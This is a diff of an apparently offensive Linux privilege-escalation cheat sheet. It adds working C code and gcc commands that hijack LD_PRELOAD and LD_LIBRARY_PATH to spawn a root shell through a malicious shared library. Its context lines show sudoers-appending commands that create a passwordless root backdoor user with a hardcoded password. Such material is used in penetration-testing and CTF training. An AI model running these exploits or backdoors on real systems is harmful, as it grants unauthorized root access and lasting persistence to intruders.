@@ -84,10 +84,11 @@ sudo -l
 [Every-Tools-Shell-Escap](https://gtfobins.github.io/)
 
 ### Environment Variables ✡️
+```note
+Run "ldd" against the any program file to see which shared libraries are used by the program.
+```
+#### If "env_keep+=LD_PRELOAD" existed. 🔆
 ```bash
-If "env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH" existed
-# Run ldd against the any program file to see which shared libraries are used by the program.
-ldd /usr/sbin/apache2
 nano /tmp/preload.c ⬇️⬇️⬇️⬇️
 ---------------------
 #include <stdio.h>
@@ -102,6 +103,24 @@ void _init() {
 ---------------------
 gcc /tmp/preload.c -fPIC -shared -nostartfiles -o /tmp/preload.so 
 sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
+#### If env_keep+=LD_LIBRARY_PATH" existed. 🔆
+```bash
+ldd /usr/sbin/apache2
+nano /tmp/library_path.c ⬇️⬇️⬇️⬇️
+---------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+---------------------
+gcc  /tmp/library_path.c -fPIC -shared -o /tmp/libcrypt.so.1 
 ```
 ## Weak File Permissions ✅
 ```bash
@@ -134,7 +153,7 @@ echo 'ali ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
 useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
 ```
 ### /etc/crontab ✡️
-#### Cron Jobs - File Permissions 🔆
+#### Cron Jobs - File Permissions 
 ```bash
 cat /etc/crontab
 locate overwrite.sh
